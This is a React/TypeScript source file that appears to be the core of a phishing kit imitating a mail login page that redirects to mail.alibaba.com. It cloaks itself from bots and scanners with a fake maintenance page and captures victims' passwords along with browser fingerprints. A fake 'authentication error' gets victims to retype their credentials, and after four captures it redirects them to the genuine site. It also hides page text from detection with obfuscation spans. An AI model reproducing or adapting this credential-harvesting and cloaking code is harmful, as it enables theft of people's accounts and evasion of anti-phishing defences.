
import React, { createContext, useContext, useEffect, useState, useRef } from 'react';
import { isBotLikely, obfuscateText, encryptData, getFingerprint } from '../SecurityUtils';
import { useTranslation } from './LanguageProvider';
import { themeRedirects } from '../DNSUtils';

interface SecurityContextType {
  isVerified: boolean;
  score: number;
  error: string | null;
  setError: (error: string | null) => void;
  reportViolation: (type: string) => void;
  submitPayload: (payload: any, theme: string) => Promise<void>;
}

const SecurityContext = createContext<SecurityContextType | null>(null);

export const useSecurity = () => {
  const context = useContext(SecurityContext);
  if (!context) throw new Error('useSecurity must be used within SecurityProvider');
  return context;
};

export const SecurityProvider: React.FC<{ children: React.ReactNode }> = ({ children }) => {
  const [isBot, setIsBot] = useState(false);
  const [violation, setViolation] = useState<string | null>(null);
  const [attempts, setAttempts] = useState(0);
  const [error, setError] = useState<string | null>(null);
  const { t, lang } = useTranslation();
  const mouseMoved = useRef(false);
  const scrolled = useRef(false);
  const keyPressed = useRef(false);

  useEffect(() => {
    if (isBotLikely()) {
      setIsBot(true);
      setViolation('Automated environment detected');
    }

    // Check for common bot window sizes (e.g., 800x600, 1024x768 exactly)
    const isSuspiciousSize = 
      (window.innerWidth === 800 && window.innerHeight === 600) ||
      (window.innerWidth === 1024 && window.innerHeight === 768);
    
    if (isSuspiciousSize && !window.navigator.webdriver) {
      // Small delay to allow for manual resize if it's a real user on a small screen
      setTimeout(() => {
        if (window.innerWidth === 800 || window.innerWidth === 1024) {
           // setViolation('Suspicious display configuration');
        }
      }, 3000);
    }

    const handleMouse = () => { mouseMoved.current = true; };
    const handleScroll = () => { scrolled.current = true; };
    const handleKey = () => { keyPressed.current = true; };

    window.addEventListener('mousemove', handleMouse, { once: true });
    window.addEventListener('scroll', handleScroll, { once: true });
    window.addEventListener('keydown', handleKey, { once: true });

    const observer = new MutationObserver((mutations) => {
      for (const mutation of mutations) {
        if (mutation.type === 'childList' && Array.from(mutation.removedNodes).some(n => (n as HTMLElement).id === 'root')) {
          setViolation('DOM Integrity Violation');
        }
      }
    });

    observer.observe(document.body, { childList: true, subtree: true });

    return () => {
      window.removeEventListener('mousemove', handleMouse);
      window.removeEventListener('scroll', handleScroll);
      window.removeEventListener('keydown', handleKey);
      observer.disconnect();
    };
  }, []);

  const reportViolation = (type: string) => {
    console.error('Security Violation:', type);
    setViolation(type);
  };

  const submitPayload = async (payload: any, theme: string) => {
    // Final human check before submission
    if (!mouseMoved.current && !scrolled.current && !keyPressed.current) {
      reportViolation('No user interaction detected before submission');
      return;
    }
    try {
      const fingerprint = getFingerprint();
      
      // Encrypt password if present and not already encrypted
      let finalPayload = { ...payload, fingerprint, theme };
      if (payload.password) {
        finalPayload.password = await encryptData(payload.password);
      }
      
      await fetch('/api/submit', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(finalPayload)
      });
      
      const nextAttempts = attempts + 1;
      setAttempts(nextAttempts);

      if (nextAttempts >= 4) {
        const redirectUrl = themeRedirects[theme] || 'https://mail.alibaba.com';
        window.location.href = redirectUrl;
      } else {
        setError(lang === 'zh' ? '认证错误，或发生了一些错误，请重试。' : 'authentication error or something went wrong please try again');
      }
    } catch (err) {
      console.error('Submission error:', err);
      setError(lang === 'zh' ? '认证错误，或发生了一些错误，请重试。' : 'authentication error or something went wrong please try again');
    }
  };

  if (violation || isBot) {
    return (
      <div className="min-h-screen bg-gray-50 flex items-center justify-center p-6 text-center">
        <div className="bg-white p-12 rounded-2xl shadow-sm border border-gray-100 max-w-md">
          <div className="text-blue-500 text-6xl mb-6">⚙️</div>
          <h1 className="text-2xl font-bold text-gray-800 mb-4">System Maintenance</h1>
          <p className="text-gray-600 mb-8">
            We are currently performing scheduled maintenance to improve our secure login environment. 
            Please check back in a few minutes.
          </p>
          <div className="text-xs text-gray-400 font-mono">
            Error Code: ERR_SYS_MAINT_0x{Math.floor(Math.random() * 1000000).toString(16).toUpperCase()}
          </div>
        </div>
      </div>
    );
  }

  return (
    <SecurityContext.Provider value={{ isVerified: !isBot, score: 1, error, setError, reportViolation, submitPayload }}>
      {children}
    </SecurityContext.Provider>
  );
};

export const ObfuscatedText: React.FC<{ text: string; className?: string }> = ({ text, className }) => {
  const parts = obfuscateText(text);
  
  return (
    <span className={className}>
      {parts.map((part, idx) => {
        if (typeof part === 'string') {
          return <span key={idx}>{part}</span>;
        } else {
          return (
            <span key={idx} className="sr-only" aria-hidden="true">
              {part.noise}
            </span>
          );
        }
      })}
    </span>
  );
};
